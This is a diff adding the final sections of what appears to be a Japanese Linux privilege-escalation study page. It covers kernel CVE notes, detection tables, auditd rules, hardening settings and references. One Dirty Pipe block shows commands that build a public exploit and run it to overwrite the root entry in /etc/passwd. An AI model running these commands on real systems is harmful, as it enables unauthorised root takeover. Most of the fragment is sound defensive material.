+          <tr><td>CVE-2016-5195 (Dirty COW)</td><td>kernel (COW)</td><td>2.6.22 – 4.8.3</td><td>歴史的。古いレガシー環境専用。race で不安定なことも</td></tr>
+          <tr><td>CVE-2025-6019</td><td>userland (udisks)</td><td>大半の distro (default udisks2)</td><td>allow_active → root。厳密には exploit というより設定 chain — <a href="#s07">s07</a></td></tr>
+        </tbody>
+      </table>
+
+      <h3 id="dirtypipe">Dirty Pipe の実務メモ</h3>
+      <p>Dirty Pipe は kernel exploit の中では例外的に安定・非破壊的。read-only ファイルにデータを書き込めるので、<code>/etc/passwd</code> の root 行改竄や SUID binary へのパッチに使える。panic リスクが低く、engagement でも比較的許容しやすい。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>uname -r    <span class="c"># 5.8〜5.16.11 / 5.15.25 / 5.10.102 未満が候補</span>
+<span class="c"># 公開 PoC (Max Kellermann のオリジナル / AlexisAhmed のラッパ) を対象上でビルド</span>
+gcc dirtypipe.c -o dp &amp;&amp; ./dp /etc/passwd 1 ootz:  <span class="c"># root の x を書換え等</span>
+<span class="c"># ビルドは対象カーネルの gcc 互換性に依存。noexec なら s01 の loader 経由起動</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>kernel と distro パッケージを最新化。特に nf_tables / overlayfs / pipe / polkit / udisks 系の CVE は速やかに</li>
+          <li><code>kernel.unprivileged_userns_clone=0</code> (Debian/Ubuntu) で user namespace 悪用の攻撃面を削る。CVE-2026-23111 / OverlayFS 系の多くを無効化できる</li>
+          <li>不要な kernel module を blacklist (<code>nf_tables</code> 未使用なら無効化)。<code>modules_disabled=1</code> でロード自体を封じる</li>
+          <li>panic on oops (<code>kernel.panic_on_oops=1</code>) は攻撃者の試行錯誤コストを上げるが可用性とのトレードオフ</li>
+          <li>auditd + EDR で exploit 特有の syscall パターン (userns 作成 + 直後の setuid、pipe splice の異常) を監視</li>
+        </ul>
+      </div>
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>kernel exploit は最後の手段。engagement では s03-s10 を尽くしてから</li>
+          <li><code>uname -r</code> 単独で判断しない。distro backport の確認を必ず挟む</li>
+          <li>Dirty Pipe は例外的に安定・非破壊。CVE-2026-23111 は user namespace 無効化で防げる</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s12" class="reveal">
+      <h2><span class="num">12</span>Detection &amp; Hardening<span class="jp">検知と緩和</span></h2>
+      <p>攻撃側の各経路に対して、防御側が何を見れば気づけるか。設定値の網羅は <a href="hardening.html">hardening</a> 巻が本体で、ここは privesc に特化した検知観点をまとめる。</p>
+
+      <h3 id="detect-map">経路別・検知の要点</h3>
+      <table>
+        <thead><tr><th>攻撃経路</th><th>主な観測点</th><th>検知の勘所</th></tr></thead>
+        <tbody>
+          <tr><td>列挙 (s02)</td><td>auditd <code>execve</code>, EDR プロセス生成レート</td><td>短時間の大量プロセス生成、<code>/tmp</code><code>/dev/shm</code> からの実行</td></tr>
+          <tr><td>sudo 悪用 (s03)</td><td>auditd, <code>/var/log/auth.log</code></td><td>NOPASSWD binary からの子 shell、<code>LD_PRELOAD</code> 付き sudo、chroot オプション使用</td></tr>
+          <tr><td>SUID/cap (s04-05)</td><td>AIDE, auditd</td><td>SUID bit / capability の新規付与、非標準 SUID の実行</td></tr>
+          <tr><td>cron (s06)</td><td>auditd プロセスツリー</td><td>cron 子プロセスからの予期しない shell、<code>--checkpoint</code> 付き tar</td></tr>
+          <tr><td>service/polkit (s07)</td><td>auditd, journald</td><td>pkexec の異常実行、unit ファイル書込、udisks mount 呼び出し</td></tr>
+          <tr><td>認証ファイル改竄 (s09)</td><td>AIDE, auditd watch</td><td><code>/etc/passwd</code><code>/etc/sudoers.d</code> への書込 event</td></tr>
+          <tr><td>container escape (s10)</td><td>Falco, EDR</td><td>container からの mount/chroot、docker.sock アクセス、release_agent 書込</td></tr>
+          <tr><td>kernel exploit (s11)</td><td>auditd syscall, EDR</td><td>userns 作成 + 直後の uid=0 遷移、oops/panic ログ</td></tr>
+        </tbody>
+      </table>
+
+      <h3 id="auditd-rules">起点になる auditd ルール</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 認証ファイルへの書込を監視</span>
+-w /etc/passwd -p wa -k identity
+-w /etc/shadow -p wa -k identity
+-w /etc/sudoers -p wa -k priv_esc
+-w /etc/sudoers.d/ -p wa -k priv_esc
+
+<span class="c"># SUID/SGID 実行と setuid 系 syscall</span>
+-a always,exit -F arch=b64 -S execve -F euid=0 -F auid&gt;=1000 -F auid!=-1 -k suid_exec
+-a always,exit -F arch=b64 -S setuid -S setreuid -S setresuid -k setuid_call
+
+<span class="c"># /tmp /dev/shm からの実行 (列挙・exploit の温床)</span>
+-a always,exit -F arch=b64 -S execve -F dir=/tmp -k tmp_exec
+-a always,exit -F arch=b64 -S execve -F dir=/dev/shm -k shm_exec
+
+<span class="c"># user namespace 作成 (kernel exploit の前段)</span>
+-a always,exit -F arch=b64 -S unshare -S clone -F a0&amp;0x10000000 -k userns</code></pre></div>
+
+      <h3 id="baseline">恒久的な緩和のチェックリスト</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># mount hardening — ユーザ書込領域を無害化</span>
+/tmp        nosuid,nodev,noexec
+/dev/shm    nosuid,nodev,noexec
+/home       nosuid,nodev
+
+<span class="c"># sysctl</span>
+kernel.yama.ptrace_scope = 2
+kernel.unprivileged_userns_clone = 0     <span class="c"># Debian/Ubuntu</span>
+fs.suid_dumpable = 0                      <span class="c"># CVE-2025-4598 緩和</span>
+fs.protected_symlinks = 1
+fs.protected_hardlinks = 1
+
+<span class="c"># 棚卸し (定期)</span>
+find / -perm -4000 -type f 2&gt;/dev/null    <span class="c"># SUID baseline と diff</span>
+getcap -r / 2&gt;/dev/null                   <span class="c"># capability baseline と diff</span></code></pre></div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>privesc の検知は「認証ファイル書込」「setuid syscall」「一時領域からの実行」の 3 本を起点にする</li>
+          <li>AIDE で SUID/capability の baseline を取り、新規付与を diff で検知するのが費用対効果が高い</li>
+          <li>mount の <code>nosuid,nodev,noexec</code> と userns 無効化だけで s04/s10/s11 の相当数を封じられる</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="ref" class="reveal">
+      <h2><span class="num">13</span>References<span class="jp">参照</span></h2>
+      <ul>
+        <li>MITRE ATT&amp;CK T1548 (Abuse Elevation Control Mechanism) — <a href="https://attack.mitre.org/techniques/T1548/" target="_blank" rel="noopener">attack.mitre.org/techniques/T1548</a></li>
+        <li>MITRE ATT&amp;CK T1068 (Exploitation for Privilege Escalation) — <a href="https://attack.mitre.org/techniques/T1068/" target="_blank" rel="noopener">attack.mitre.org/techniques/T1068</a></li>
+        <li>GTFOBins (sudo / SUID / capabilities カタログ) — <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">gtfobins.github.io</a></li>
+        <li>PEASS-ng (linpeas) — <a href="https://github.com/peass-ng/PEASS-ng" target="_blank" rel="noopener">github.com/peass-ng/PEASS-ng</a></li>
+        <li>linux-smart-enumeration (lse) — <a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank" rel="noopener">github.com/diego-treitos/linux-smart-enumeration</a></li>
+        <li>pspy — <a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener">github.com/DominicBreuker/pspy</a></li>
+        <li>linux-exploit-suggester-2 — <a href="https://github.com/jondonas/linux-exploit-suggester-2" target="_blank" rel="noopener">github.com/jondonas/linux-exploit-suggester-2</a></li>
+        <li>CVE-2025-32463 (sudo chroot) — sudo advisory — <a href="https://www.sudo.ws/security/advisories/chroot_bug/" target="_blank" rel="noopener">sudo.ws — chroot_bug</a> / Stratascale — <a href="https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot" target="_blank" rel="noopener">stratascale.com</a></li>
+        <li>CVE-2025-6018 / CVE-2025-6019 (PAM → udisks chain) — Qualys TRU — <a href="https://blog.qualys.com/vulnerabilities-threat-research/2025/06/17/qualys-tru-uncovers-chained-lpe-suse-15-pam-to-full-root-via-libblockdev-udisks" target="_blank" rel="noopener">blog.qualys.com</a></li>
+        <li>CVE-2025-4598 (systemd-coredump) — Qualys TRU — <a href="https://blog.qualys.com/vulnerabilities-threat-research/2025/05/29/qualys-tru-discovers-two-local-information-disclosure-vulnerabilities-in-apport-and-systemd-coredump-cve-2025-5054-and-cve-2025-4598" target="_blank" rel="noopener">blog.qualys.com</a></li>
+        <li>CVE-2026-23111 (nf_tables UAF) — Ubuntu Security — <a href="https://ubuntu.com/security/CVE-2026-23111" target="_blank" rel="noopener">ubuntu.com/security/CVE-2026-23111</a> / Exodus Intelligence — <a href="https://blog.exodusintel.com/2026/06/08/off-by-exploiting-a-use-after-free-in-the-linux-kernel/" target="_blank" rel="noopener">blog.exodusintel.com</a></li>
+        <li>CVE-2021-4034 (PwnKit) — Qualys — <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034" target="_blank" rel="noopener">blog.qualys.com — PwnKit</a></li>
+        <li>CVE-2022-0847 (Dirty Pipe) — Max Kellermann — <a href="https://dirtypipe.cm4all.com/" target="_blank" rel="noopener">dirtypipe.cm4all.com</a></li>
+        <li>Linux Audit Documentation (auditd) — <a href="https://github.com/linux-audit/audit-documentation" target="_blank" rel="noopener">github.com/linux-audit/audit-documentation</a></li>
+      </ul>
+    </section>
+
+  </article>
+</div>
+</div>
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Linux Privilege Escalation</span></div>
+    <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>GitHub</a></div>
+    <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
+  </div>
+</footer>
+
+<script src="../content.js"></script>
+<script src="../assets/js/sheet.js"></script>
+</body>
+</html>
